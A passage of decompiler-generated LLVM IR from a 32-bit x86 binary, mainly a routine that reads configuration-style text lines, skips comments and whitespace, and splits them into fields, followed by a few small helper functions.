  br i1 %tmp42, label %dec_label_pc_80511db, label %dec_label_pc_8050ff1

dec_label_pc_8050ff1:                             ; preds = %dec_label_pc_8050fb4
  store i32 ptrtoint (i32* @global_var_8054c90.199 to i32), i32* %stack_var_-216, align 4
  %v2_8050ffd = call i32 @function_804b888(i32 ptrtoint ([17 x i8]* @global_var_8054c5e.200 to i32), i32 ptrtoint (i32* @global_var_8054c90.199 to i32))
  store i32 %v2_8050ffd, i32* @eax, align 4
  store i32 %v2_8050ffd, i32* @ebp, align 4
  %v1_8051007 = icmp eq i32 %v2_8050ffd, 0
  %v1_8051009 = icmp eq i1 %v1_8051007, false
  br i1 %v1_8051009, label %dec_label_pc_80511a6.preheader, label %dec_label_pc_805100f

dec_label_pc_805100f:                             ; preds = %dec_label_pc_8050ff1
  store i32 ptrtoint (i32* @global_var_8054c90.199 to i32), i32* %stack_var_-216, align 4
  %v2_805101b = call i32 @function_804b888(i32 ptrtoint ([24 x i8]* @global_var_8054c6f.201 to i32), i32 ptrtoint (i32* @global_var_8054c90.199 to i32))
  store i32 %v2_805101b, i32* @ebp, align 4
  %v1_8051025 = icmp eq i32 %v2_805101b, 0
  %v1_8051027 = icmp eq i1 %v1_8051025, false
  br i1 %v1_8051027, label %dec_label_pc_80511a6.preheader, label %dec_label_pc_80511d0

dec_label_pc_80511a6.preheader:                   ; preds = %dec_label_pc_8050ff1, %dec_label_pc_805100f
  %v2_80511ad = ptrtoint i32* %stack_var_-180 to i32
  %v3_80510e1 = add i32 %v3_8050fc3, 164
  %v0_80511a6101 = load i32, i32* @edx, align 4
  store i32 128, i32* %stack_var_-216, align 4
  store i32 %v2_80511ad, i32* @ebx, align 4
  %v3_80511b2102 = call i32 @function_804cbf4(i32 %v2_80511ad, i32 128, i32 %v0_80511a6101)
  store i32 %v3_80511b2102, i32* @eax, align 4
  %v1_80511ba103 = icmp eq i32 %v3_80511b2102, 0
  %v1_80511bc104 = icmp eq i1 %v1_80511ba103, false
  br i1 %v1_80511bc104, label %dec_label_pc_8051033.preheader.lr.ph, label %dec_label_pc_80511c2

dec_label_pc_8051033.preheader.lr.ph:             ; preds = %dec_label_pc_80511a6.preheader
  %v4_80510cb = inttoptr i32 %tmp to i8*
  br label %dec_label_pc_8051033.preheader

dec_label_pc_8051032:                             ; preds = %dec_label_pc_805103d
  %v1_8051032 = add i32 %v0_805103255, 1
  store i32 %v1_8051032, i32* @ebx, align 4
  %v1_8051033 = inttoptr i32 %v1_8051032 to i8*
  %v2_8051033 = load i8, i8* %v1_8051033, align 1
  %v3_8051033 = zext i8 %v2_8051033 to i32
  %v5_8051033 = and i32 %v6_805103358, -256
  %v6_8051033 = or i32 %v3_8051033, %v5_8051033
  store i32 %v6_8051033, i32* @ecx, align 4
  %v4_8051035 = icmp eq i8 %v2_8051033, 0
  br i1 %v4_8051035, label %dec_label_pc_80511a6.backedge, label %dec_label_pc_805103d

dec_label_pc_805103d:                             ; preds = %dec_label_pc_805103d.lr.ph, %dec_label_pc_8051032
  %v6_805103358 = phi i32 [ %v6_805103353, %dec_label_pc_805103d.lr.ph ], [ %v6_8051033, %dec_label_pc_8051032 ]
  %v2_805103357 = phi i8 [ %v2_805103350, %dec_label_pc_805103d.lr.ph ], [ %v2_8051033, %dec_label_pc_8051032 ]
  %v1_805103356 = phi i8* [ %v1_805103349, %dec_label_pc_805103d.lr.ph ], [ %v1_8051033, %dec_label_pc_8051032 ]
  %v0_805103255 = phi i32 [ %v0_8051033.pre, %dec_label_pc_805103d.lr.ph ], [ %v1_8051032, %dec_label_pc_8051032 ]
  %v2_805103d = sext i8 %v2_805103357 to i32
  store i32 %v2_805103d, i32* @edx, align 4
  store i32 %v0_8051040.pre, i32* @eax, align 4
  %v2_8051045 = mul nsw i32 %v2_805103d, 2
  %v3_8051045 = add i32 %v0_8051040.pre, %v2_8051045
  %v4_8051045 = inttoptr i32 %v3_8051045 to i8*
  %v5_8051045 = load i8, i8* %v4_8051045, align 1
  %v6_8051045 = and i8 %v5_8051045, 32
  %v7_8051045 = icmp eq i8 %v6_8051045, 0
  %v1_8051049 = icmp eq i1 %v7_8051045, false
  br i1 %v1_8051049, label %dec_label_pc_8051032, label %dec_label_pc_805104b

dec_label_pc_805104b:                             ; preds = %dec_label_pc_805103d
  %v10_805104b = icmp eq i8 %v2_805103357, 10
  br i1 %v10_805104b, label %dec_label_pc_80511a6.backedge, label %dec_label_pc_8051054

dec_label_pc_80511a6.backedge:                    ; preds = %dec_label_pc_8051033.preheader, %dec_label_pc_8051032, %dec_label_pc_805116c, %dec_label_pc_805119b, %dec_label_pc_8051173, %dec_label_pc_805104b, %dec_label_pc_8051054, %dec_label_pc_8051125
  %v0_80511a6 = load i32, i32* @edx, align 4
  store i32 128, i32* %stack_var_-216, align 4
  store i32 %v2_80511ad, i32* @ebx, align 4
  %v3_80511b2 = call i32 @function_804cbf4(i32 %v2_80511ad, i32 128, i32 %v0_80511a6)
  store i32 %v3_80511b2, i32* @eax, align 4
  %v1_80511ba = icmp eq i32 %v3_80511b2, 0
  %v1_80511bc = icmp eq i1 %v1_80511ba, false
  br i1 %v1_80511bc, label %dec_label_pc_8051033.preheader, label %dec_label_pc_80511c2

dec_label_pc_8051054:                             ; preds = %dec_label_pc_805104b
  %v10_805105c = icmp eq i8 %v2_805103357, 35
  %v1_805105f = icmp eq i1 %v10_805105c, false
  br i1 %v1_805105f, label %dec_label_pc_80510b0.preheader, label %dec_label_pc_80511a6.backedge

dec_label_pc_80510b0.preheader:                   ; preds = %dec_label_pc_8051054
  %v2_80510b04 = load i8, i8* %v1_805103356, align 1
  %v3_80510b05 = icmp eq i8 %v2_80510b04, 0
  br i1 %v3_80510b05, label %dec_label_pc_80510bc, label %dec_label_pc_80510b5

dec_label_pc_8051066:                             ; preds = %dec_label_pc_80510b5
  store i32 %stack_var_-196.011, i32* @eax, align 4
  %v1_805106a = load i32, i32* @esp, align 4
  %v3_805106a = mul nuw nsw i32 %stack_var_-196.011, 4
  %v4_805106a = add nuw nsw i32 %v3_805106a, 152
  %v5_805106a = add i32 %v4_805106a, %v1_805106a
  %v6_805106a = inttoptr i32 %v5_805106a to i32*
  store i32 %v0_805106a, i32* %v6_805106a, align 4
  %v0_8051074.pre = load i32, i32* @ebx, align 4
  %v4_8051074.pre = load i32, i32* @ecx, align 4
  %v1_805107459 = inttoptr i32 %v0_8051074.pre to i8*
  %v2_805107460 = load i8, i8* %v1_805107459, align 1
  %v3_805107461 = zext i8 %v2_805107460 to i32
  %v5_805107462 = and i32 %v4_8051074.pre, -256
  %v6_805107463 = or i32 %v3_805107461, %v5_805107462
  %v4_805107664 = icmp eq i8 %v2_805107460, 0
  br i1 %v4_805107664, label %dec_label_pc_8051093.preheader, label %dec_label_pc_805107a.lr.ph

dec_label_pc_805107a.lr.ph:                       ; preds = %dec_label_pc_8051066
  %v0_805107d.pre = load i32, i32* @global_var_8056080, align 128
  br label %dec_label_pc_805107a

dec_label_pc_8051073:                             ; preds = %dec_label_pc_8051088
  %v1_8051073 = add i32 %v0_805107365, 1
  store i32 %v1_8051073, i32* @ebx, align 4
  %v1_8051074 = inttoptr i32 %v1_8051073 to i8*
  %v2_8051074 = load i8, i8* %v1_8051074, align 1
  %v3_8051074 = zext i8 %v2_8051074 to i32
  %v5_8051074 = and i32 %v6_805107467, -256
  %v6_8051074 = or i32 %v3_8051074, %v5_8051074
  %v4_8051076 = icmp eq i8 %v2_8051074, 0
  br i1 %v4_8051076, label %dec_label_pc_8051093.preheader, label %dec_label_pc_805107a

dec_label_pc_805107a:                             ; preds = %dec_label_pc_805107a.lr.ph, %dec_label_pc_8051073
  %v6_805107467 = phi i32 [ %v6_805107463, %dec_label_pc_805107a.lr.ph ], [ %v6_8051074, %dec_label_pc_8051073 ]
  %v2_805107466 = phi i8 [ %v2_805107460, %dec_label_pc_805107a.lr.ph ], [ %v2_8051074, %dec_label_pc_8051073 ]
  %v0_805107365 = phi i32 [ %v0_8051074.pre, %dec_label_pc_805107a.lr.ph ], [ %v1_8051073, %dec_label_pc_8051073 ]
  %v2_805107a = sext i8 %v2_805107466 to i32
  store i32 %v2_805107a, i32* @edx, align 4
  store i32 %v0_805107d.pre, i32* @eax, align 4
  %v2_8051082 = mul nsw i32 %v2_805107a, 2
  %v3_8051082 = add i32 %v0_805107d.pre, %v2_8051082
  %v4_8051082 = inttoptr i32 %v3_8051082 to i8*
  %v5_8051082 = load i8, i8* %v4_8051082, align 1
  %v6_8051082 = and i8 %v5_8051082, 32
  %v7_8051082 = icmp eq i8 %v6_8051082, 0
  %v1_8051086 = icmp eq i1 %v7_8051082, false
  br i1 %v1_8051086, label %dec_label_pc_8051093.preheader, label %dec_label_pc_8051088

dec_label_pc_8051088:                             ; preds = %dec_label_pc_805107a
  %v10_8051088 = icmp eq i8 %v2_805107466, 10
  %v1_805108b = icmp eq i1 %v10_8051088, false
  br i1 %v1_805108b, label %dec_label_pc_8051073, label %dec_label_pc_8051093.preheader

dec_label_pc_8051093.preheader:                   ; preds = %dec_label_pc_8051088, %dec_label_pc_805107a, %dec_label_pc_8051073, %dec_label_pc_8051066
  %v0_8051073.lcssa = phi i32 [ %v0_8051074.pre, %dec_label_pc_8051066 ], [ %v1_8051073, %dec_label_pc_8051073 ], [ %v0_805107365, %dec_label_pc_805107a ], [ %v0_805107365, %dec_label_pc_8051088 ]
  %v6_8051074.lcssa = phi i32 [ %v6_805107463, %dec_label_pc_8051066 ], [ %v6_8051074, %dec_label_pc_8051073 ], [ %v6_805107467, %dec_label_pc_805107a ], [ %v6_805107467, %dec_label_pc_8051088 ]
  %v1_805109373 = inttoptr i32 %v0_8051073.lcssa to i8*
  %v2_805109374 = load i8, i8* %v1_805109373, align 1
  %v3_805109375 = zext i8 %v2_805109374 to i32
  %v5_805109376 = and i32 %v6_8051074.lcssa, -256
  %v6_805109377 = or i32 %v3_805109375, %v5_805109376
  store i32 %v6_805109377, i32* @ecx, align 4
  %v4_805109578 = icmp eq i8 %v2_805109374, 0
  br i1 %v4_805109578, label %dec_label_pc_80510ac, label %dec_label_pc_8051099

dec_label_pc_805108f:                             ; preds = %dec_label_pc_80510a7, %dec_label_pc_8051099
  store i8 0, i8* %v1_805109380, align 1
  %v0_8051092 = load i32, i32* @ebx, align 4
  %v1_8051092 = add i32 %v0_8051092, 1
  store i32 %v1_8051092, i32* @ebx, align 4
  %v4_8051093.pre = load i32, i32* @ecx, align 4
  %v1_8051093 = inttoptr i32 %v1_8051092 to i8*
  %v2_8051093 = load i8, i8* %v1_8051093, align 1
  %v3_8051093 = zext i8 %v2_8051093 to i32
  %v5_8051093 = and i32 %v4_8051093.pre, -256
  %v6_8051093 = or i32 %v3_8051093, %v5_8051093
  store i32 %v6_8051093, i32* @ecx, align 4
  %v4_8051095 = icmp eq i8 %v2_8051093, 0
  br i1 %v4_8051095, label %dec_label_pc_80510ac, label %dec_label_pc_8051099

dec_label_pc_8051099:                             ; preds = %dec_label_pc_8051093.preheader, %dec_label_pc_805108f
  %v2_805109381 = phi i8 [ %v2_8051093, %dec_label_pc_805108f ], [ %v2_805109374, %dec_label_pc_8051093.preheader ]
  %v1_805109380 = phi i8* [ %v1_8051093, %dec_label_pc_805108f ], [ %v1_805109373, %dec_label_pc_8051093.preheader ]
  %v0_80510b079 = phi i32 [ %v1_8051092, %dec_label_pc_805108f ], [ %v0_8051073.lcssa, %dec_label_pc_8051093.preheader ]
  %v2_8051099 = sext i8 %v2_805109381 to i32
  store i32 %v2_8051099, i32* @edx, align 4
  %v0_805109c = load i32, i32* @global_var_8056080, align 128
  store i32 %v0_805109c, i32* @eax, align 4
  %v2_80510a1 = mul nsw i32 %v2_8051099, 2
  %v3_80510a1 = add i32 %v0_805109c, %v2_80510a1
  %v4_80510a1 = inttoptr i32 %v3_80510a1 to i8*
  %v5_80510a1 = load i8, i8* %v4_80510a1, align 1
  %v6_80510a1 = and i8 %v5_80510a1, 32
  %v7_80510a1 = icmp eq i8 %v6_80510a1, 0
  %v1_80510a5 = icmp eq i1 %v7_80510a1, false
  br i1 %v1_80510a5, label %dec_label_pc_805108f, label %dec_label_pc_80510a7

dec_label_pc_80510a7:                             ; preds = %dec_label_pc_8051099
  %v10_80510a7 = icmp eq i8 %v2_805109381, 10
  br i1 %v10_80510a7, label %dec_label_pc_805108f, label %dec_label_pc_80510ac

dec_label_pc_80510ac:                             ; preds = %dec_label_pc_805108f, %dec_label_pc_80510a7, %dec_label_pc_8051093.preheader
  %v0_80510b0.lcssa = phi i32 [ %v0_8051073.lcssa, %dec_label_pc_8051093.preheader ], [ %v0_80510b079, %dec_label_pc_80510a7 ], [ %v1_8051092, %dec_label_pc_805108f ]
  %v1_8051093.lcssa = phi i8* [ %v1_805109373, %dec_label_pc_8051093.preheader ], [ %v1_805109380, %dec_label_pc_80510a7 ], [ %v1_8051093, %dec_label_pc_805108f ]
  %v4_80510ac = add nuw nsw i32 %stack_var_-196.011, 1
  %v2_80510b0 = load i8, i8* %v1_8051093.lcssa, align 1
  %v3_80510b0 = icmp eq i8 %v2_80510b0, 0
  br i1 %v3_80510b0, label %dec_label_pc_80510bc, label %dec_label_pc_80510b5

dec_label_pc_80510b5:                             ; preds = %dec_label_pc_80510b0.preheader, %dec_label_pc_80510ac
  %v0_805106a = phi i32 [ %v0_80510b0.lcssa, %dec_label_pc_80510ac ], [ %v0_805103255, %dec_label_pc_80510b0.preheader ]
  %stack_var_-196.011 = phi i32 [ %v4_80510ac, %dec_label_pc_80510ac ], [ 0, %dec_label_pc_80510b0.preheader ]
  %v7_80510ba = icmp sgt i32 %stack_var_-196.011, 4
  br i1 %v7_80510ba, label %dec_label_pc_80510bc, label %dec_label_pc_8051066

dec_label_pc_80510bc:                             ; preds = %dec_label_pc_80510ac, %dec_label_pc_80510b5, %dec_label_pc_80510b0.preheader
  %stack_var_-196.0.lcssa = phi i32 [ 0, %dec_label_pc_80510b0.preheader ], [ %v4_80510ac, %dec_label_pc_80510ac ], [ %stack_var_-196.011, %dec_label_pc_80510b5 ]
  store i32 %tmp, i32* @edi, align 4
  %v0_80510c3 = load i32, i32* @esi, align 4
  store i32 ptrtoint ([11 x i8]* @global_var_8054c87.202 to i32), i32* %stack_var_-216, align 4
  %v5_80510cb = call i32 @function_8051620(i8* %v4_80510cb, i32 ptrtoint ([11 x i8]* @global_var_8054c87.202 to i32), i32 %v0_80510c3, i32 %v0_80510c3)
  store i32 %v5_80510cb, i32* @eax, align 4
  store i32 1, i32* @esi, align 4
  %v1_80510d8 = icmp eq i32 %v5_80510cb, 0
  br i1 %v1_80510d8, label %dec_label_pc_8051100.preheader, label %dec_label_pc_8051111

dec_label_pc_8051100.preheader:                   ; preds = %dec_label_pc_80510bc
  %v5_805110488 = icmp sgt i32 %stack_var_-196.0.lcssa, 1
  br i1 %v5_805110488, label %dec_label_pc_8051106.lr.ph, label %dec_label_pc_8051111

dec_label_pc_8051106.lr.ph:                       ; preds = %dec_label_pc_8051100.preheader
  %v0_8051106.pre = load i32, i32* @global_var_8058d74.138, align 4
  br label %dec_label_pc_8051106

dec_label_pc_80510de:                             ; preds = %dec_label_pc_8051106
  %v2_80510e1 = mul i32 %v1_80510e189, 4
  %v4_80510e1 = add i32 %v2_80510e1, %v3_80510e1
  %v5_80510e1 = inttoptr i32 %v4_80510e1 to i32*
  %v6_80510e1 = load i32, i32* %v5_80510e1, align 4
  %v1_80510e8 = call i32 @function_804d32c(i32 %v6_80510e1)
  %v0_80510ed = load i32, i32* @esi, align 4
  %v1_80510ed = add i32 %v0_80510ed, 1
  store i32 %v1_80510ed, i32* @esi, align 4
  %v1_80510ee = load i32, i32* @ebx, align 4
  %v2_80510ee = mul i32 %v1_80510ee, 4
  %v3_80510ee = add i32 %v2_80510ee, 134581608
  %v4_80510ee = inttoptr i32 %v3_80510ee to i32*
  store i32 %v1_80510e8, i32* %v4_80510ee, align 4
  %v0_80510f5 = load i32, i32* @ebx, align 4
  %v1_80510f5 = add i32 %v0_80510f5, 1
  store i32 %v1_80510f5, i32* @eax, align 4
  store i32 %v1_80510f5, i32* @global_var_8058d74.138, align 4
  %v0_8051100.pre = load i32, i32* @esi, align 4
  %v5_8051104 = icmp slt i32 %v0_8051100.pre, %stack_var_-196.0.lcssa
  br i1 %v5_8051104, label %dec_label_pc_8051106, label %dec_label_pc_8051111

dec_label_pc_8051106:                             ; preds = %dec_label_pc_8051106.lr.ph, %dec_label_pc_80510de
  %v0_8051106 = phi i32 [ %v0_8051106.pre, %dec_label_pc_8051106.lr.ph ], [ %v1_80510f5, %dec_label_pc_80510de ]
  %v1_80510e189 = phi i32 [ 1, %dec_label_pc_8051106.lr.ph ], [ %v0_8051100.pre, %dec_label_pc_80510de ]
  store i32 %v0_8051106, i32* @ebx, align 4
  %v7_805110f = icmp sgt i32 %v0_8051106, 2
  br i1 %v7_805110f, label %dec_label_pc_8051111, label %dec_label_pc_80510de

dec_label_pc_8051111:                             ; preds = %dec_label_pc_8051100.preheader, %dec_label_pc_80510de, %dec_label_pc_8051106, %dec_label_pc_80510bc
  %v0_8051111 = load i32, i32* @ebx, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_8054c92.203 to i32), i32* %stack_var_-216, align 4
  %v0_8051118 = load i32, i32* @edi, align 4
  %v4_8051119 = inttoptr i32 %v0_8051118 to i8*
  %v5_8051119 = call i32 @function_8051620(i8* %v4_8051119, i32 ptrtoint ([7 x i8]* @global_var_8054c92.203 to i32), i32 %v0_8051111, i32 %v0_8051111)
  store i32 %v5_8051119, i32* @eax, align 4
  %v1_8051121 = icmp eq i32 %v5_8051119, 0
  br i1 %v1_8051121, label %dec_label_pc_8051163.preheader, label %dec_label_pc_8051125

dec_label_pc_8051125:                             ; preds = %dec_label_pc_8051111
  %v0_8051125 = load i32, i32* @ecx, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_8054c99.204 to i32), i32* %stack_var_-216, align 4
  %v0_805112c = load i32, i32* @edi, align 4
  %v4_805112d = inttoptr i32 %v0_805112c to i8*
  %v5_805112d = call i32 @function_8051620(i8* %v4_805112d, i32 ptrtoint ([7 x i8]* @global_var_8054c99.204 to i32), i32 %v0_8051125, i32 %v0_8051125)
  %v1_8051135 = icmp eq i32 %v5_805112d, 0
  br i1 %v1_8051135, label %dec_label_pc_8051163.preheader, label %dec_label_pc_80511a6.backedge

dec_label_pc_8051163.preheader:                   ; preds = %dec_label_pc_8051111, %dec_label_pc_8051125
  %v0_805116390 = load i32, i32* @global_var_8058d78.197, align 8
  %tmp4392 = icmp slt i32 %v0_805116390, 1
  %tmp4493 = icmp eq i1 %tmp4392, false
  br i1 %tmp4493, label %dec_label_pc_805113b, label %dec_label_pc_805116c

dec_label_pc_805113b:                             ; preds = %dec_label_pc_8051163.preheader, %dec_label_pc_805113b.dec_label_pc_805113b_crit_edge
  %v0_805116394 = phi i32 [ %v0_8051163, %dec_label_pc_805113b.dec_label_pc_805113b_crit_edge ], [ %v0_805116390, %dec_label_pc_8051163.preheader ]
  %v1_805113b = add i32 %v0_805116394, -1
  store i32 %v1_805113b, i32* @global_var_8058d78.197, align 8
  %v1_8051144 = mul i32 %v1_805113b, 4
  %v2_8051144 = add i32 %v1_8051144, 134581592
  %v3_8051144 = inttoptr i32 %v2_8051144 to i32*
  %v4_8051144 = load i32, i32* %v3_8051144, align 4
  %v1_805114b = call i32 @function_804e725(i32 %v4_8051144)
  %v0_8051150 = load i32, i32* @global_var_8058d78.197, align 8
  %v1_8051158 = mul i32 %v0_8051150, 4
  %v2_8051158 = add i32 %v1_8051158, ptrtoint (i32* @global_var_8058d58.205 to i32)
  %v3_8051158 = inttoptr i32 %v2_8051158 to i32*
  store i32 0, i32* %v3_8051158, align 4
  %v0_8051163 = load i32, i32* @global_var_8058d78.197, align 8
  %tmp43 = icmp slt i32 %v0_8051163, 1
  %tmp44 = icmp eq i1 %tmp43, false
  br i1 %tmp44, label %dec_label_pc_805113b.dec_label_pc_805113b_crit_edge, label %dec_label_pc_805116c

dec_label_pc_805113b.dec_label_pc_805113b_crit_edge: ; preds = %dec_label_pc_805113b
  br label %dec_label_pc_805113b

dec_label_pc_805116c:                             ; preds = %dec_label_pc_805113b, %dec_label_pc_8051163.preheader
  %v0_8051163.lcssa = phi i32 [ %v0_805116390, %dec_label_pc_8051163.preheader ], [ %v0_8051163, %dec_label_pc_805113b ]
  store i32 1, i32* @esi, align 4
  %v5_805119998 = icmp sgt i32 %stack_var_-196.0.lcssa, 1
  br i1 %v5_805119998, label %dec_label_pc_805119b, label %dec_label_pc_80511a6.backedge

dec_label_pc_8051173:                             ; preds = %dec_label_pc_805119b
  %v2_8051176 = mul i32 %v1_8051176100, 4
  %v4_8051176 = add i32 %v2_8051176, %v3_80510e1
  %v5_8051176 = inttoptr i32 %v4_8051176 to i32*
  %v6_8051176 = load i32, i32* %v5_8051176, align 4
  %v1_805117d = call i32 @function_804d32c(i32 %v6_8051176)
  %v0_8051182 = load i32, i32* @esi, align 4
  %v1_8051182 = add i32 %v0_8051182, 1
  store i32 %v1_8051182, i32* @esi, align 4
  %v1_8051183 = load i32, i32* @ebx, align 4
  %v2_8051183 = mul i32 %v1_8051183, 4
  %v3_8051183 = add i32 %v2_8051183, 134581592
  %v4_8051183 = inttoptr i32 %v3_8051183 to i32*
  store i32 %v1_805117d, i32* %v4_8051183, align 4
  %v0_805118a = load i32, i32* @ebx, align 4
  %v1_805118a = add i32 %v0_805118a, 1
  store i32 %v1_805118a, i32* @global_var_8058d78.197, align 8
  %v0_8051195.pre = load i32, i32* @esi, align 4
  %v5_8051199 = icmp slt i32 %v0_8051195.pre, %stack_var_-196.0.lcssa
  br i1 %v5_8051199, label %dec_label_pc_805119b, label %dec_label_pc_80511a6.backedge

dec_label_pc_805119b:                             ; preds = %dec_label_pc_805116c, %dec_label_pc_8051173
  %v1_8051176100 = phi i32 [ %v0_8051195.pre, %dec_label_pc_8051173 ], [ 1, %dec_label_pc_805116c ]
  %v0_805119b99 = phi i32 [ %v1_805118a, %dec_label_pc_8051173 ], [ %v0_8051163.lcssa, %dec_label_pc_805116c ]
  store i32 %v0_805119b99, i32* @ebx, align 4
  %v7_80511a4 = icmp sgt i32 %v0_805119b99, 3
  br i1 %v7_80511a4, label %dec_label_pc_80511a6.backedge, label %dec_label_pc_8051173

dec_label_pc_8051033.preheader:                   ; preds = %dec_label_pc_8051033.preheader.lr.ph, %dec_label_pc_80511a6.backedge
  %v0_8051033.pre = load i32, i32* @ebx, align 4
  %v4_8051033.pre = load i32, i32* @ecx, align 4
  %v1_805103349 = inttoptr i32 %v0_8051033.pre to i8*
  %v2_805103350 = load i8, i8* %v1_805103349, align 1
  %v3_805103351 = zext i8 %v2_805103350 to i32
  %v5_805103352 = and i32 %v4_8051033.pre, -256
  %v6_805103353 = or i32 %v3_805103351, %v5_805103352
  store i32 %v6_805103353, i32* @ecx, align 4
  %v4_805103554 = icmp eq i8 %v2_805103350, 0
  br i1 %v4_805103554, label %dec_label_pc_80511a6.backedge, label %dec_label_pc_805103d.lr.ph

dec_label_pc_805103d.lr.ph:                       ; preds = %dec_label_pc_8051033.preheader
  %v0_8051040.pre = load i32, i32* @global_var_8056080, align 128
  br label %dec_label_pc_805103d

dec_label_pc_80511c2:                             ; preds = %dec_label_pc_80511a6.backedge, %dec_label_pc_80511a6.preheader
  %v0_80511c5 = load i32, i32* @ebp, align 4
  %v1_80511c6 = inttoptr i32 %v0_80511c5 to i16*
  %v2_80511c6 = call i32 @function_804b77c(i16* %v1_80511c6)
  br label %dec_label_pc_80511db

dec_label_pc_80511d0:                             ; preds = %dec_label_pc_805100f
  %v0_80511d0 = call i32 @function_804fae4()
  %v1_80511d5 = inttoptr i32 %v0_80511d0 to i32*
  store i32 3, i32* %v1_80511d5, align 4
  br label %dec_label_pc_80511db

dec_label_pc_80511db:                             ; preds = %dec_label_pc_8050fb4, %dec_label_pc_80511c2, %dec_label_pc_80511d0
  store i32 1, i32* %stack_var_-216, align 4
  store i32 %v2_8050fc8, i32* @eax, align 4
  %v2_80511e7 = call i32 @function_804f2ae(i32 %v2_8050fc8, i32 1)
  store i32 %v0_8050fb4, i32* @ebp, align 4
  ret i32 %v2_80511e7

; uselistorder directives
  uselistorder i32 %v0_8051040.pre, { 1, 0 }
  uselistorder i32 %v6_805103353, { 1, 0 }
  uselistorder i8 %v2_805103350, { 1, 2, 0 }
  uselistorder i8* %v1_805103349, { 1, 0 }
  uselistorder i32 %v0_8051033.pre, { 1, 0 }
  uselistorder i32 %v0_8051163, { 0, 2, 1 }
  uselistorder i32 %v1_805113b, { 1, 0 }
  uselistorder i32 %v0_8051106, { 1, 0 }
  uselistorder i32 %v0_8051100.pre, { 1, 0 }
  uselistorder i32 %stack_var_-196.0.lcssa, { 3, 1, 2, 0 }
  uselistorder i32 %stack_var_-196.011, { 0, 1, 3, 2, 4 }
  uselistorder i32 %v2_8051099, { 1, 0 }
  uselistorder i8 %v2_805109381, { 1, 0 }
  uselistorder i32 %v2_805107a, { 1, 0 }
  uselistorder i8 %v2_805107466, { 1, 0 }
  uselistorder i32 %v1_8051073, { 0, 2, 1, 3 }
  uselistorder i32 %v2_805103d, { 1, 0 }
  uselistorder i32 %v1_8051032, { 1, 0, 2 }
  uselistorder i32 %v2_80511ad, { 2, 3, 0, 1 }
  uselistorder i32 %v2_805101b, { 1, 0 }
  uselistorder i32 %v2_8050ffd, { 1, 0, 2 }
  uselistorder i32* %stack_var_-216, { 1, 3, 4, 5, 2, 0, 6, 7, 9, 8 }
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder i32 ()* @function_804fae4, { 5, 4, 2, 1, 0, 3 }
  uselistorder i32 (i32)* @function_804e725, { 17, 16, 15, 14, 13, 12, 11, 10, 1, 9, 8, 7, 6, 5, 4, 3, 19, 18, 2, 21, 20, 0 }
  uselistorder i32* @global_var_8058d78.197, { 1, 2, 3, 4, 0, 5, 6, 7 }
  uselistorder i32 152, { 1, 0, 2, 3 }
  uselistorder i8 10, { 0, 1, 2, 12, 3, 4, 5, 6, 7, 8, 9, 10, 11 }
  uselistorder i32 164, { 1, 0 }
  uselistorder i32* @global_var_8058d74.138, { 1, 0, 2, 3 }
  uselistorder i32 ptrtoint (i32* @global_var_8056090.137 to i32), { 1, 3, 4, 5, 6, 7, 8, 0, 2, 9 }
  uselistorder label %dec_label_pc_80511db, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8051033.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_805119b, { 1, 0 }
  uselistorder label %dec_label_pc_805113b, { 1, 0 }
  uselistorder label %dec_label_pc_8051163.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_8051111, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_8051106, { 1, 0 }
  uselistorder label %dec_label_pc_80510bc, { 1, 0, 2 }
  uselistorder label %dec_label_pc_80510b5, { 1, 0 }
  uselistorder label %dec_label_pc_80510ac, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8051099, { 1, 0 }
  uselistorder label %dec_label_pc_805107a, { 1, 0 }
  uselistorder label %dec_label_pc_80511a6.backedge, { 0, 3, 4, 2, 7, 6, 5, 1 }
  uselistorder label %dec_label_pc_80511a6.preheader, { 1, 0 }
}

define i32 @function_80511f8(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
dec_label_pc_80511f8:
  %v9_805121b = inttoptr i32 %arg3 to i32*
  %v10_805121b = call i32 @function_8051f31(i32 0, i32 %arg1, i32 %arg2, i32 0, i32* %v9_805121b, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7)
  ret i32 %v10_805121b
}

define i32 @function_8051224() local_unnamed_addr {
dec_label_pc_8051224:
  %stack_var_-16 = alloca i32, align 4
  %v2_8051247 = ptrtoint i32* %stack_var_-16 to i32
  %v2_805124e = call i32 @function_804f5f8(i32 9, i32 %v2_8051247)
  ret i32 %v2_805124e

; uselistorder directives
  uselistorder i32 (i32, i32)* @function_804f5f8, { 6, 4, 8, 7, 3, 2, 5, 1, 0 }
}

define i32 @function_8051258(i32 %arg1) local_unnamed_addr {
dec_label_pc_8051258:
  %v0_805125b = call i32 @function_804b5cc()
  %v2_8051267 = call i32 @function_804b65c(i32 %v0_805125b, i32 %arg1)
  ret i32 %v2_8051267
}

define i32 @function_8051270(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_8051270:
  %v1_805127e = add i32 %arg2, -1
  %v1_8051281 = urem i32 %v1_805127e, 32
  %v2_8051281 = icmp eq i32 %v1_8051281, 0
  %v2_8051284 = udiv i32 %v1_805127e, 32
  br i1 %v2_8051281, label %bb5, label %bb

bb:                                               ; preds = %dec_label_pc_8051270
  %v5_8051287 = shl i32 1, %v1_8051281
  br label %bb5

bb5:                                              ; preds = %dec_label_pc_8051270, %bb
  %v6_8051289 = phi i32 [ 1, %dec_label_pc_8051270 ], [ %v5_8051287, %bb ]
  %v2_8051289 = mul nuw nsw i32 %v2_8051284, 4
  %v3_8051289 = add i32 %v2_8051289, %arg1
  %v4_8051289 = inttoptr i32 %v3_8051289 to i32*
  %v5_8051289 = load i32, i32* %v4_8051289, align 4
  %v7_8051289 = and i32 %v5_8051289, %v6_8051289
  %v8_8051289 = icmp eq i32 %v7_8051289, 0
  %v1_805128d = icmp eq i1 %v8_8051289, false
  %v2_805128d = zext i1 %v1_805128d to i32
  ret i32 %v2_805128d

; uselistorder directives
  uselistorder i32 %v1_8051281, { 1, 0 }
  uselistorder label %bb5, { 1, 0 }
}

define i32 @function_8051294(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
